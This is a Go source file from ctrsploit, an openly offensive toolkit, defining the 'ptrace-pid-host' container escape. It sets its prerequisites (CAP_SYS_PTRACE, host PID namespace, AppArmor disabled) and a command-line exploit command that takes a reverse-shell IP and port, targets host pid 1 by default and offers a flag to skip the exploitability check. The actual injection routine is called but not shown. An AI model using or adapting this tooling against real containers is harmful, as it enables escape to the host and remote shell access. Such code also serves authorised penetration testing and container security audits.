package pid_host

import (
	"github.com/ctrsploit/ctrsploit/prerequisite/apparmor"
	"github.com/ctrsploit/ctrsploit/prerequisite/capability"
	"github.com/ctrsploit/ctrsploit/prerequisite/namespace"
	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/prerequisite"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/urfave/cli/v2"
)

var (
	flagsExploit = []cli.Flag{
		&cli.StringFlag{
			Name:    "ip",
			Aliases: []string{"i"},
			Usage:   "ip address of reverse shell",
		},
		&cli.StringFlag{
			Name:    "port",
			Aliases: []string{"p"},
			Value:   "2333",
		},
		&cli.StringFlag{
			Name:    "pid",
			Aliases: []string{"t"},
			Value:   "1",
		},
		&cli.BoolFlag{
			Name:    "listen",
			Aliases: []string{"l"},
			Value:   true,
		},
		&cli.BoolFlag{
			Name:    "force",
			Aliases: []string{"f"},
			Usage:   "ignore exploitable check",
			Value:   false,
		},
	}
	CheckSecCmd = getCheckSecCmd(Vul.GetName(), Vul.GetDescription(), []string{"ptrace-pid"})
	ExploitCmd  = GetExploitCmd(Vul.GetName(), Vul.GetDescription(), []string{"ptrace-pid"})
	VulCmd      = app.Vul2VulCmd(&Vul, []string{"pid"}, nil, flagsExploit, true)
)

type vulnerability struct {
	vul.BaseVulnerability
}

var (
	Vul = vulnerability{
		BaseVulnerability: vul.BaseVulnerability{
			Name:        "ptrace-pid-host",
			Description: "Container can be escaped when has cap_sys_ptrace and host pid namespace",
			Level:       vul.LevelHigh,
			ExeEnv: exeenv.ExeEnv{
				Env:     exeenv.InContainer,
				Check:   exeenv.InContainer,
				Exploit: exeenv.InContainer,
			},
			CheckSecPrerequisites: prerequisite.And(
				&capability.CapSysPtraceBnd,
				&namespace.PidNamespaceLevelHost,
			),
			ExploitablePrerequisites: prerequisite.And(
				&capability.CapSysPtraceEff,
				&apparmor.Disabled,
			),
		},
	}
)

func (v *vulnerability) Exploit(context *cli.Context) (err error) {
	err = v.BaseVulnerability.Exploit(context)
	if err != nil {
		return
	}
	ip := context.String("ip")
	if ip == "" {
		ip, err = getIp()
		if err != nil {
			return err
		}
	}
	return Exploit(context.Int("pid"), ip, context.Int("port"), context.Bool("listen"))
}

func getCheckSecCmd(name, usage string, aliases []string) (cmd *cli.Command) {
	cmd = app.Vul2ChecksecCmd(&Vul, aliases, nil)
	cmd.Name = name
	cmd.Usage = usage
	cmd.Aliases = aliases
	return
}

func GetExploitCmd(name, usage string, aliases []string) (cmd *cli.Command) {
	return &cli.Command{
		Name:    name,
		Usage:   usage,
		Aliases: aliases,
		Flags:   flagsExploit,
		Action: func(context *cli.Context) (err error) {
			_, err = Vul.CheckSec(context)
			if err != nil {
				return
			}
			err = Vul.Exploit(context)
			return
		},
	}
}
